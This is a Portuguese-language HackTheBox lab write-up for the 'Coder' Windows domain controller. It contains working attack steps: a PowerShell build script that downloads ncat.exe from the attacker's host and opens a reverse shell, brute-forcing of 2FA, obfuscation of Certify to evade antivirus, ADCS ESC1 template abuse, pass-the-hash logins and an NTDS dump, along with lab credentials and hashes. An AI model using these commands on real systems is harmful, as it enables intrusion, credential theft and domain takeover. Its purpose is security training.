<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Coder - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/Ax606jt.png)

**Tools:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient
crackmapexec
DNSpy
Keepass
BurpSuite
evil-winrm
Certify
bloodhound
Certipy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**TCP Scan:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-26 02:43:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-26T02:44:39+00:00; +6h24m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
|_ssl-date: 2023-05-26T02:44:40+00:00; +6h24m05s from scanner time.
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-04T17:25:43
| Not valid after:  2032-11-01T17:25:43
| MD5:   e5fea439d8356660c2b778e578a1244e
|_SHA-1: 733cf4571caafdaa8ad1e8fb0abc6fec7f932977
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
|_ssl-date: 2023-05-26T02:44:40+00:00; +6h24m05s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-26T02:44:39+00:00; +6h24m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
|_ssl-date: 2023-05-26T02:44:40+00:00; +6h24m05s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
53696/tcp open  msrpc         Microsoft Windows RPC
57826/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-26T02:44:31
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h24m05s, deviation: 0s, median: 6h24m04s

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**UDP Scan:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT    STATE SERVICE VERSION
53/udp  open  domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
123/udp open  ntp     NTP v3
| ntp-info: 
|_  receive time stamp: 2023-04-02T03:27:47
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.93%I=7%D=4/1%Time=64288652%P=x86_64-pc-linux-gnu%r(NBTSt
SF:at,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAA\0\0!\0\x01");

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Primeiro vamos adicionar os nomes descobertos no scan no nosso arquivo /etc/hosts.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo '10.10.11.207   coder.htb dc01.coder.htb' >> /etc/hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Podemos ver que o servidor SMB permite login como anonymous:

![Image](https://i.imgur.com/O5sn42y.png)

Usamos o CrackMapExec para fazer a enumeracao e consultar as permissoes que temos.

![Image](https://i.imgur.com/d87bSb9.png)


Temos permissao de leitura no diretorio "Development", portanto, vamos acessa-lo.

![Image](https://i.imgur.com/UxRzONc.png)

Temos uma pasta chamada "Migrations":

![Image](https://i.imgur.com/YIcZYvM.png)


Na pasta "Temporary Projects", temos 2 arquivos, um binario(.exe) e um arquivo criptografado(.enc).
Vamos salvar ambos em nossa maquina.

![Image](https://i.imgur.com/Wu0foij.png)


Agora vamos abrir o DNSpy para fazer o reversing do Encryptor.exe

![Image](https://i.imgur.com/9XNGjws.png)

Dentro do DNSpy, podemos ver a forma como a criptografia esta sendo feita e a utilizacao da Classe RijndaelManaged

https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndaelmanaged?view=net-7.0


Portanto, podemos criar um script para tentar fazer o processo contrario.

Nesse trecho, podemos perceber que e baseado no timestamp entao temos que colocar isso em nosso script.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
long value = DateTimeOffset.Now.ToUnixTimeSeconds();
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Portanto, vamos conferir no smb:

![Image](https://i.imgur.com/HrXXmPO.png)

Agora escrevemos nossso codigo para descriptografar o arquivo s.blade.enc

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.IO;
using System.Security.Cryptography;

internal class FileDecryptor
{
    public static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("You must provide the name of a file to decrypt");
            return;
        }

        string sourceFile = args[0];
        string destFile = Path.ChangeExtension(sourceFile, ".dec");

        DateTimeOffset dto = new DateTimeOffset(2022, 11, 11, 19, 17, 8, new TimeSpan(-3, 0, 0));
        long value = dto.ToUnixTimeSeconds();
        Random random = new Random(Convert.ToInt32(value));
        byte[] array = new byte[16];
        random.NextBytes(array);
        byte[] array2 = new byte[32];
        random.NextBytes(array2);
        byte[] array3 = DecryptFile(sourceFile, destFile, array2, array);
    }

    private static byte[] DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
    {
        using Aes aes = Aes.Create();
        aes.Key = Key;
        aes.IV = IV;

        using FileStream stream = new FileStream(destFile, FileMode.Create);
        using ICryptoTransform transform = aes.CreateDecryptor();
        using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
        using FileStream fileStream = new FileStream(sourceFile, FileMode.Open);

        byte[] array = new byte[1024];
        int count;

        try
        {
            while ((count = fileStream.Read(array, 0, array.Length)) != 0)
            {
                cryptoStream.Write(array, 0, count);
            }
        }
        catch (CryptographicException ex)
        {
            Console.WriteLine("Decryption failed: " + ex.Message);
            return null;
        }

        return null;
    }
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora podemos fazer o build do nosso codigo

![Image](https://i.imgur.com/P7ZrKWg.png)


Agora podemos executar nosso codigo e informar o arquivo a ser descriptografado.

![Image](https://i.imgur.com/SqGvcxH.png)

Agora ao listar novamente, temos o arquivo s.blade.dec, o que significa que nosso script funcionou.

![Image](https://i.imgur.com/2x3KX71.png)

Analisando o arquivo de saida, podemos ver que eh um arquivo 7z.

![Image](https://i.imgur.com/la5l6oj.png)

Agora vamos renomear o arquivo de .dec para .7z

![Image](https://i.imgur.com/zG9JEqk.png)

Agora extraimos os arquivos utilizando o 7z.

![Image](https://i.imgur.com/bJe0ATD.png)

Com isso, temos 2 arquivos obtidos, um arquivo ".key" e um arquivo "s.blade.kdbx", pesquisando sobre essa extensao, pude perceber que se tratava de um arquivo Keepass.

![Image](https://i.imgur.com/uh7RXEU.png)

Abrimos o arquivo no Keepass e utilizamos a key obtida para desbloquear a masterkey.


![Image](https://i.imgur.com/dd8AR1O.png)


Com o acesso completo ao Keepass, podemos obter outro subdominio e crenciais para ele.
![Image](https://i.imgur.com/0Wm77WS.png)

Entao adicionamos o nome do subdominio em nosso arquivo /etc/hosts.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo '10.10.11.207   teamcity-dev.coder.htb' >> /etc/hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao acessa-la via web, temos uma pagina de login, onde vamos usar as credenciais obtidas para autenticar.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
s.blade
veh5nUSZFFoqz9CrrhSeuwhA
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


![Image](https://i.imgur.com/RWid5z0.png)

Ao logar na aplicacao, somos redirecionados para uma autenticacao de 2 fatores(2FA).

![Image](https://i.imgur.com/LYX0F2j.png)

Essa 2FA, nao possui nenhum tipo de protecao contra forca bruta.
Portanto vamos enviar a requisicao para o Intruder no BurpSuite para realizar essa tarefa.

![Image](https://i.imgur.com/EJDA3jI.png)

Usaremos a lista da seclists:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/usr/share/seclists/Fuzzing/6-digits-000000-999999.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/naIwGwb.png)


Depois de um longo tempo... conseguimos o 2FA:

![Image](https://i.imgur.com/m5cZGg9.png)

Ao completarmos os passos de autenticacao, temos acesso a um JetBrains.

![Image](https://i.imgur.com/DKh7XW3.png)


Podemos executar a task atraves do botao "Run", e podemos consultar o Build Log para verificar o que esta sendo executado.

![Image](https://i.imgur.com/xMKwUoI.png)

Ele executa um script chamado "hello_world.ps1", esse script, esta localizado no SMB na pasta teamcity_test_repo.

![Image](https://i.imgur.com/A8kKanC.png)

Podemos conectar no SMB diretamente no explorer para obter os arquivos.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smb://coder.htb/Development
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/EIlzrbz.png)

Agora copiamos todo o repositorio para nossa maquina

![Image](https://i.imgur.com/AZ2XfLX.png)







Com o diretorio clonado, podemos ver os logs do git e tambem interagirmos com ele.

![Image](https://i.imgur.com/gmjh5Un.png)

No site ao clicarmos em "..." ao lado de Run, temos a opcao de "run as a personal build" onde nos permite fazer o upload de um arquivo diff.

Portanto, podemos editar o arquivo "hello_world.ps1" para conseguirmos executar comandos quando o diff for executado.
Colocaremos no arquivo diff alguns comandos, todos esses comandos serao executados, criaremos o diretorio C:/temp para conseguirmos escrever o ncat.exe que baixaremos de nossa maquina para criar a conexao reversa para obtermos uma shell.


Para isso precisaremos abrir um webserver em nossa maquina, utilizaremos o python:

![Image](https://i.imgur.com/2EwMnXG.png)

Nosso arquivo hello_world.ps1:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#Simple repo test for Teamcity pipeline
mkdir C:\temp
Invoke-WebRequest -Uri http://10.10.14.54/other/ncat.exe -outfile C:\temp\ncat.exe
write-host "Hello, World!"
whoami /all
net user /domain
net user e.black /domain
$netcatPath = 'C:\temp\ncat.exe'
$arguments = '-e', 'powershell.exe', '10.10.14.54', '4444'
$process = Start-Process -FilePath $netcatPath -ArgumentList $arguments -NoNewWindow -PassThru
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora utilizamos o git diff para montar nosso arquivo:

![Image](https://i.imgur.com/twGPjR4.png)

Temos nosso arquivo diff criado:

![Image](https://i.imgur.com/8aygM9l.png)

Agora faremos o upload do arquivo diff e inciamos a execucao.

![Image](https://i.imgur.com/nIPN2Pi.png)


Ao executarmos, podemos ver que o codigo foi o output no build log.

![Image](https://i.imgur.com/Y4RNXS8.png)


Recebemos a conexao em nosso servidor python:

![Image](https://i.imgur.com/h9YyxAy.png)


Em poucos instantes, recebemos a nossa shell.

![Image](https://i.imgur.com/jTb9hUe.png)

Apos algum tempo de enumeracao(longo tempo) encontrei um arquivo diff com comandos powershell.

![Image](https://i.imgur.com/NNQOhKW.png)
![Image](https://i.imgur.com/UYGLvdV.png)



Removemos os sinais (+) e enviamos o arquivo enc.txt e key.txt para a pasta C:\temp\

![Image](https://i.imgur.com/kjH4jUL.png)

Podemos usar o powershell para obter a senha do usuario e.black.
Utilizaremos os comandos:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$key = Get-Content ".\key.txt"
$encryptedContent = Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key
$unsecurePassword = (New-Object PSCredential 0, $encryptedContent).GetNetworkCredential().Password
echo $unsecurePassword
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Com isso temos:

![Image](https://i.imgur.com/bT81QdX.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
e.black:ypOSJXPqlDOxxbQSfEERy300
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora podemos acessar via WinRM.

![Image](https://i.imgur.com/E8XN5GH.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evil-winrm -i 10.10.11.207 -u e.black -p ypOSJXPqlDOxxbQSfEERy300
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Com isso, podemos obter a flag de user.

![Image](https://i.imgur.com/u6omv9S.png)

Partimos para o caminho do user Administrator.

Ao iniciar a enumeracao, percebi que o user e.black pertence a um grupo chamado "PKI Admins"

![Image](https://i.imgur.com/p8hczB4.png)


Pesquisando sobre esse grupo, podemos encontrar links que mencionam o "AD CS", o que pode ser um vetor para a escalacao de privilegios.

Vamos utilizar o Bloodhound para analisar o AD e suas permissoes.
Utilizaremos o method "All" e salvaremos tudo em um zip.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -m bloodhound -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -d coder.htb -c all -dc dc01.coder.htb -ns 10.10.11.207 --zip
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/Skiqc0a.png)

Para conseguirmos ver os resultados, primeiro, iniciamos o neo4j.

![Image](https://i.imgur.com/vJsxaBn.png)


Em seguida executamos o Bloodhound:

![Image](https://i.imgur.com/gfhL2xX.png)


No bloodhound, podemos encontrar os templates, existentes.

![Image](https://i.imgur.com/zTZRF3V.png)


Utilizaremos o Certify.exe para interagir com esses templates.

Ao tentarmos utilizar o Certify.exe, podemos perceber a existencia de um AV.

![Image](https://i.imgur.com/28gUzlG.png)


Entao, vamos utilizar o NimPackt para obfuscar nosso Certify.exe

![Image](https://i.imgur.com/X3qlETC.png)



Agora enviamos ele novamente ao nosso alvo, e executamos:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-WebRequest -Uri http://10.10.14.11/CertifyExecAssemblyNimPackt.exe -Outfile Certify.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Podemos perceber que o AV nao pegou nosso binario :)

![Image](https://i.imgur.com/OQx78aT.png)


Utilizamos o certify para buscar por templates vulneraveis:

![Image](https://i.imgur.com/J7JSB4R.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Certify.exe find /vulnerable
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nesse caso, nao foi possivel encontrar nenhum template vulneravel :/

Mas! Podemos enviar um novo template:

Vamos utilizar este o template ESC1.json, disponivel no github: 

https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json

Adicionamos no ESC1.json este trecho, permite que o grupo PKI Admins tenha permissões de enroll.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"msPKI-Enrollment-ACL": [
        {
            "AccessString": "1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639.2",
            "Group": "CN=PKI Admins,CN=Users,DC=coder,DC=htb"
        }
    ]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Fazemos o upload do ESC1.json para o servidor com o nome de chu.json:

![Image](https://i.imgur.com/dw1UIZ7.png)



Agora utilizamos o conteudo do arquivo ESC1.json para criar um novo template, criaremos um chamado 'chu'

![image](https://i.imgur.com/oBmTPVh.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New-ADCSTemplate -DisplayName chu -JSON (Get-Content .\chu.json -Raw) -Publish -Identity "CODER\PKI Admins"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Com o template criado do lado do servidor, utilizamos o certipy para solicitar um certificado com o UPN: Administrator

![Image](https://i.imgur.com/no0iLoZ.png)

Conseguimos criar o certificado com sucesso, mas ao tentar autenticar, recebemos o erro de relogio incorreto.

![Image](https://i.imgur.com/Ru3q64l.png)


Utilizamos o ntpdate para sincronizarmos o relogio com o AD.

![Image](https://i.imgur.com/t03KPJa.png)

Com o horario correto, podemos autenticar com o certificado e obter a hash do usuario Administrator.

![Image](https://i.imgur.com/oFjT2On.png)


Com a hash do Administrator logamos  com o evil-winrm

![Image](https://i.imgur.com/1WeSfRj.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evil-winrm -i 10.10.11.207 -u administrator -H 807726fcf9f188adc26eeafd7dc16bb7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Podemos obter as outras hashes com o CrackMapExec:

![Image](https://i.imgur.com/YQaQWVr.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
./cme smb 10.10.11.207 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7 --ntds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



if i helped you, add + respect at my profile :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>
 
my references
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndaelmanaged?view=net-7.0
https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
https://www.prosec-networks.com/en/blog/adcs-privescaas/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin
https://0xalwayslucky.gitbook.io/cybersecstack/active-directory/adcs-privesc-certificate-templates
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366
https://github.com/ly4k/Certipy
https://exploit-notes.hdks.org/exploit/windows/active-directory/ad-cs-pentesting/
https://github.com/Orange-Cyberdefense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json
https://hackinglethani.com/ad-certificate-templates/
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)
https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/
https://notes.offsec-journey.com/privilege-escalation/domain-privilege-escalation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
